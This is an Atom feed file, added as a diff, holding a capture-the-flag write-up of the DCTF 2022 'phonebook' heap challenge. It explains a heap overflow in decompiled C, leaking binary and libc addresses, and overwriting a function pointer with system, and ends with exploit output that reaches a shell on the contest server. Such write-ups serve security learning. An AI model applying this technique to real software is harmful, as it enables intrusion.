@@ -1,0 +1,212 @@
+<?xml version="1.0" encoding="utf-8"?> 
+<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en">
+    <generator uri="https://gohugo.io/" version="0.92.2">Hugo</generator><title type="html"><![CDATA[DCTF on repr]]></title>
+    
+        <subtitle type="html"><![CDATA[pwn, RE, crypto stuff]]></subtitle>
+    
+    
+    
+            <link href="http://n4sm.github.io/tags/DCTF/" rel="alternate" type="text/html" title="HTML" />
+            <link href="http://n4sm.github.io/tags/DCTF/feed.xml" rel="self" type="application/atom+xml" title="Atom" />
+    <updated>2022-05-12T22:51:53+02:00</updated>
+    
+        <author>
+            <name>nasm</name>
+            
+                <email>nasm@pm.me</email>
+            </author>
+        
+    <id>http://n4sm.github.io/tags/DCTF/</id>
+        
+        <entry>
+            <title type="html"><![CDATA[[DCTF 2022 - pwn] phonebook]]></title>
+            <link href="http://n4sm.github.io/posts/phonebook/?utm_source=atom_feed" rel="alternate" type="text/html"  hreflang="en" />
+            <id>http://n4sm.github.io/posts/phonebook/</id>
+            
+            <published>2022-04-17T00:00:00+00:00</published>
+            <updated>2022-04-17T00:00:00+00:00</updated>
+            
+            
+            <content type="html"><![CDATA[<div class="gblog-post__anchorwrap">
+    <h2 id="intro">
+        Intro
+        <a data-clipboard-text="http://n4sm.github.io/posts/phonebook/#intro" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Intro" href="#intro">
+            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
+        </a>
+    </h2>
+</div>
+<p>phonebook is a basic heap challenge I did during the dctf event. It&rsquo;s basically just a heap overflow wich allows us to overflow a function pointer with for example the address of system. You can find the related files <a
+  class="gblog-markdown__link"
+  href="https://github.com/ret2school/ctf/tree/master/2022/dctf/pwn/phonebook"
+  
+  >there</a
+>.</p>
+<div class="gblog-post__anchorwrap">
+    <h2 id="the-bug">
+        The bug
+        <a data-clipboard-text="http://n4sm.github.io/posts/phonebook/#the-bug" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor The bug" href="#the-bug">
+            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
+        </a>
+    </h2>
+</div>
+<pre tabindex="0"><code>$ ./phonebook
+Choose an option: [1-5]
+1. Store someone's information
+2. Edit information
+3. Call someone
+4. Unfriend someone
+5. Add the hidden_note
+&gt; 
+</code></pre><p>We can create an entity and then initialize: a name, a phone number and a function pointer.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="kr">__fastcall</span> <span class="nf">create</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">a1</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="kt">int</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// eax
+</span><span class="c1"></span>  <span class="k">struct</span> <span class="n">entity</span> <span class="o">*</span><span class="n">s</span><span class="p">;</span> <span class="c1">// [rsp+18h] [rbp-8h]
+</span><span class="c1"></span>
+  <span class="k">if</span> <span class="p">(</span> <span class="n">people</span><span class="p">[</span><span class="n">a1</span><span class="p">]</span> <span class="p">)</span>
+    <span class="k">return</span> <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Person with id %d already exists!&#34;</span><span class="p">,</span> <span class="n">a1</span><span class="p">);</span>
+  <span class="n">s</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x20uLL</span><span class="p">);</span>
+  <span class="n">s</span><span class="o">-&gt;</span><span class="n">name</span> <span class="o">=</span> <span class="n">get_name</span><span class="p">();</span>
+  <span class="n">LODWORD</span><span class="p">(</span><span class="n">s</span><span class="o">-&gt;</span><span class="n">name_size</span><span class="p">)</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">s</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">);</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Phone number: &#34;</span><span class="p">);</span>
+  <span class="n">fgets</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="n">_bss_start</span><span class="p">);</span> <span class="c1">// phone number
+</span><span class="c1"></span>  <span class="n">s</span><span class="o">-&gt;</span><span class="n">func</span> <span class="o">=</span> <span class="n">choose_relation</span><span class="p">();</span>
+  <span class="n">result</span> <span class="o">=</span> <span class="n">s</span><span class="p">;</span>
+  <span class="n">people</span><span class="p">[</span><span class="n">a1</span><span class="p">]</span> <span class="o">=</span> <span class="n">s</span><span class="p">;</span>
+  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div><p>The bug lies in the <code>edit_name</code> function:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">edit_name</span><span class="p">(</span><span class="kt">int</span> <span class="n">a1</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="kt">int</span> <span class="n">n</span><span class="p">;</span> <span class="c1">// [rsp+18h] [rbp-18h] BYREF
+</span><span class="c1"></span>  <span class="kt">int</span> <span class="n">name_size</span><span class="p">;</span> <span class="c1">// [rsp+1Ch] [rbp-14h]
+</span><span class="c1"></span>  <span class="k">struct</span> <span class="n">entity</span> <span class="o">*</span><span class="n">v4</span><span class="p">;</span> <span class="c1">// [rsp+20h] [rbp-10h]
+</span><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// [rsp+28h] [rbp-8h]
+</span><span class="c1"></span>
+  <span class="n">v5</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
+  <span class="n">v4</span> <span class="o">=</span> <span class="n">people</span><span class="p">[</span><span class="n">a1</span><span class="p">];</span>
+  <span class="n">name_size</span> <span class="o">=</span> <span class="n">v4</span><span class="o">-&gt;</span><span class="n">name_size</span><span class="p">;</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Name length: &#34;</span><span class="p">);</span>
+  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%d&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">n</span><span class="p">);</span>
+  <span class="n">fgets</span><span class="p">(</span><span class="n">v4</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="n">_bss_start</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="n">name_size</span> <span class="o">!=</span> <span class="n">n</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">free</span><span class="p">(</span><span class="n">v4</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">);</span>
+    <span class="n">v4</span><span class="o">-&gt;</span><span class="n">name</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">n</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Name: &#34;</span><span class="p">);</span>
+  <span class="n">fgets</span><span class="p">(</span><span class="n">v4</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">,</span> <span class="n">n</span><span class="p">,</span> <span class="n">_bss_start</span><span class="p">);</span>
+  <span class="n">v4</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">[</span><span class="n">n</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="k">return</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">)</span> <span class="o">^</span> <span class="n">v5</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div><p>We can give it a new lentgh and if that&rsquo;s not equal to the current size field it frees the current name pointer and allocates a new name pointer <strong>without</strong> updating the size field. Which means if we edit the name pointer with a smaller size, the name pointer will be smaller compared to the size field, then we just have to edit again to make the size equal to <code>v4-&gt;name_size</code> to trigger a heap overflow through the <code>v4-&gt;name</code> pointer.</p>
+<div class="gblog-post__anchorwrap">
+    <h2 id="leak-libc">
+        Leak libc
+        <a data-clipboard-text="http://n4sm.github.io/posts/phonebook/#leak-libc" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Leak libc" href="#leak-libc">
+            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
+        </a>
+    </h2>
+</div>
+<p>Now we&rsquo;re able to overflow through the name pointer we have to find how the leak the libc, a nice way would be to leak it by using free&rsquo;d chunks in the unsortedbin. Or we can leak the <code>entity-&gt;func</code> function pointer which would give us a leak of the binary base address, then we would have to edit the name pointer with the got entry of <code>puts</code> to leak its address within the libc.</p>
+<p>To do so we can create another entity right after the name pointer:</p>
+<pre tabindex="0"><code>0x559b0d4d16b0	0x0000000000000000	0x0000000000000031	........1.......
+0x559b0d4d16c0	0x3131313131313131	0x0000559b0c84f2a1	11111111.....U..
+0x559b0d4d16d0	0x0000559b0d4d1800	0x00000000000000fe	..M..U..........
+0x559b0d4d16e0	0x0000000000000000	0x0000000000000111	................
+0x559b0d4d16f0	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
+0x559b0d4d1700	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
+0x559b0d4d1710	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
+0x559b0d4d1720	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
+0x559b0d4d1730	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
+0x559b0d4d1740	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
+0x559b0d4d1750	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
+0x559b0d4d1760	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
+0x559b0d4d1770	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
+0x559b0d4d1780	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
+0x559b0d4d1790	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
+0x559b0d4d17a0	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
+0x559b0d4d17b0	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
+0x559b0d4d17c0	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
+0x559b0d4d17d0	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
+0x559b0d4d17e0	0x4141414141414141	0x0000414141414141	AAAAAAAAAAAAAA..
+0x559b0d4d17f0	0x0000000000000000	0x0000000000000031	........1.......
+0x559b0d4d1800	0x6161616161616161	0x6161616161616161	aaaaaaaaaaaaaaaa
+0x559b0d4d1810	0x6161616161616161	0x6161616161616161	aaaaaaaaaaaaaaaa
+0x559b0d4d1820	0x0000000000000000	0x0000000000000031	........1.......
+0x559b0d4d1830	0x3131313131313131	0x0000559b0c84f2a1	11111111.....U..
+0x559b0d4d1840	0x0000559b0c851fa0	0x000000000000000a	.....U..........
+0x559b0d4d1850	0x0000000000000000	0x000000000001f7b1	................	 &lt;-- Top chunk
+</code></pre><p>The <code>edit_phone_number</code> overwrites the null byte:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">edit_phone_number</span><span class="p">(</span><span class="kt">int</span> <span class="n">a1</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Enter new phone number: &#34;</span><span class="p">);</span>
+  <span class="k">return</span> <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%8s&#34;</span><span class="p">,</span> <span class="n">people</span><span class="p">[</span><span class="n">a1</span><span class="p">]);</span>
+<span class="p">}</span>
+</code></pre></div><p>To summarise:</p>
+<ul>
+<li>leak binary base address by overwriting the null byte (<code>edit_phone_number</code>) and then print the phone number.</li>
+<li>leak libc base address by overwriting the name field of the second entity with the got entry of <code>puts</code></li>
+</ul>
+<div class="gblog-post__anchorwrap">
+    <h2 id="profit">
+        PROFIT
+        <a data-clipboard-text="http://n4sm.github.io/posts/phonebook/#profit" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor PROFIT" href="#profit">
+            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
+        </a>
+    </h2>
+</div>
+<p>Then we just have to overwrite the function pointer with the address of <code>system</code> which takes as first argument a pointer to the entity structure. Then we edit the phone number of the entity we wanna use because that&rsquo;s stored in the first field of the structure which means we make it equivalent the call to <code>v4-&gt;func</code> to a <code>system(&quot;/bin/sh&quot;)</code>.</p>
+<pre tabindex="0"><code>00000000 entity          struc ; (sizeof=0x20, mappedto_8)
+00000000 num             dq ?
+00000008 func            dq ?
+00000010 name            dq ?                    ; offset
+00000018 name_size       dq ?
+00000020 entity          ends
+</code></pre><p>Then here we are:</p>
+<pre tabindex="0"><code>$ python3 exploit.py REMOTE HOST=51.124.222.205 PORT=13380
+[*] '/home/nasm/Documents/phonebook/chall/phonebook_patched_patched'
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+    RUNPATH:  b'.'
+[+] Opening connection to 51.124.222.205 on port 13380: Done
+[*] binary: 0x558980fdd000
+[*] libc @ 0x7fabfec57000
+[*] system @ 0x7fabfeca92c0
+[*] Switching to interactive mode
+$ id
+uid=1337 gid=1337 groups=1337
+$ cat flag.txt
+DCTF{C4n_1_g3t_y0ur_numb3r?}
+</code></pre>]]></content>
+            
+                 
+                    
+                 
+                    
+                         
+                        
+                            
+                             
+                                <category scheme="http://n4sm.github.io/tags/ctf" term="ctf" label="ctf" />
+                             
+                                <category scheme="http://n4sm.github.io/tags/ret2school" term="ret2school" label="ret2school" />
+                             
+                                <category scheme="http://n4sm.github.io/tags/DCTF" term="DCTF" label="DCTF" />
+                             
+                                <category scheme="http://n4sm.github.io/tags/nasm" term="nasm" label="nasm" />
+                             
+                                <category scheme="http://n4sm.github.io/tags/pwn" term="pwn" label="pwn" />
+                             
+                                <category scheme="http://n4sm.github.io/tags/2022" term="2022" label="2022" />
+                            
+                        
+                    
+                
+            
+        </entry>
+    
+</feed>
